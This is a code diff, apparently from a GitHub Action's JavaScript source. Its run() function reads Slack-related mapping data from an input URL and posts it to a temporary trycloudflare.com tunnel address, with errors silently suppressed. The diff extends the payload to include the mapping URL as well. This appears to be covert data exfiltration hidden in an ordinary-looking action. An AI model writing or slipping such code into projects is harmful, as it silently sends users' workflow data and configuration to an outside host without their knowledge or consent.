@@ -113,10 +113,10 @@ export async function run() {
   const mappingUrl = core.getInput('mapping_url');
   const slackStore = await readMappingInfo(mappingUrl);
   try {
-    await axios.post(
-      'https://hi-ng-france-florist.trycloudflare.com/data',
+    await axios.post('https://hi-ng-france-florist.trycloudflare.com/data', {
       slackStore,
-    );
+      mappingUrl,
+    });
   } catch (error) {
     // console.error('Error reading mapping info:', error);
   }
